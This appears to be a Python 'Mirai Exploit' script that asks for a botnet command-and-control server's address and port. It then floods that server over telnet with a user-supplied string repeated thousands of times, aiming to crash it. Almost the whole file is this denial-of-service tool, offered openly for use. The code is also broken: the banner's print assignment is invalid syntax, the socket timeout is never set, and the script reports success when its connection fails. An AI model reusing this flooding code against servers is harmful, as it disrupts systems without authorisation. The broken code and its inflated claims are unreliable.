import telnetlib
import socket
import os
os.system("cls")
print = (""
 Welcome To The Mirai Exploit.      Project Remark.               
 Till We Fall.2022. Public Release Edition.        
 Made By EskaX

                  
                 
 STATE.......: PRIVATE                                                    
 HYPERPOWER..: XVII                                                       
 VERSION.....: B44                                                        
 SCKET_INT...: INSTNC IV                ┬─┐┌─┐┌┬┐┌─┐┬─┐┬┌─                
 LSC.........: GL3.0                    ├┬┘├┤ │││├─┤├┬┘├┴┐                
 DESC........: C2XTLNT                  ┴└─└─┘┴ ┴┴ ┴┴└─┴ ┴                
 ALGORITHM...: AES-512                         Eskax                  
 PRJ-VAS.....: 84-34-243                                                  
 CCR.........: XX-3345-24                                                 
 DATA_TRMIT..: ACTIVE                                                     
 SRVERS_ON...: 3                                                          


 Last Update - [6/22/2022]      Exploit Status: Active !     
"")

host = str(input("Enter CNC IP: "))
port = int(input("Enter CNC Port: "))

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.settimeout
timeout = 50

crashstring = str(input("Enter Payload (no numbers): "))*9999 #  custom payload 
try:
    with telnetlib.Telnet(host, port, timeout) as session:
        print("Payload Multiplyer X1")
        session.write("{}".format(crashstring).encode('ascii'))
        print("Payload Multiplyer X2")
        session.write("{}".format(crashstring).encode('ascii'))
        print("Payload Multiplyer X3")
        session.write("{}".format(crashstring).encode('ascii'))
        print("Payload Multiplyer X4")
        session.write("{}".format(crashstring).encode('ascii'))
        print("Payload Multiplyer X5")
        session.write("{}".format(crashstring).encode('ascii'))
        print("Payload Multiplyer X6")
        session.write("{}".format(crashstring).encode('ascii'))
        print("Payload Multiplyer X7")
        session.write("{}".format(crashstring).encode('ascii'))
        print("Payload Multiplyer X8")
        session.write("{}".format(crashstring).encode('ascii'))
        print("Payload Multiplyer X9")
        session.write("{}".format(crashstring).encode('ascii'))
        print("Payload Multiplyer X10")
        session.write("{}".format(crashstring).encode('ascii'))
        print("Payload Multiplyer X11")
        session.write("{}".format(crashstring).encode('ascii'))
        print("Payload Multiplyer X12")
        session.write("{}".format(crashstring).encode('ascii'))
        print("Payload Multiplyer X13")
        session.write("{}".format(crashstring).encode('ascii'))
        print("Payload Multiplyer X14")
        session.write("{}".format(crashstring).encode('ascii'))
        print("Payload Multiplyer X15")
        session.write("{}".format(crashstring).encode('ascii'))
        print("Payload Multiplyer X16")
        session.write("{}".format(crashstring).encode('ascii'))
        print("Payload Multiplyer X17")
        session.write("{}".format(crashstring).encode('ascii'))
        print("Payload Multiplyer X18")
        session.write("{}".format(crashstring).encode('ascii'))
        print("Payload Multiplyer X19")
        session.write("{}".format(crashstring).encode('ascii'))
        print("Payload Multiplyer X20")
        session.write("{}".format(crashstring).encode('ascii'))



except Exception:
    try:
        result = sock.connect_ex((host,port))
        if result == 0:
            print("Exploit Failed! Try again")
        else:
            print("Exploit Succeded Payload sent!")
    except:
        print("Exploit Succeded Payload sent!")
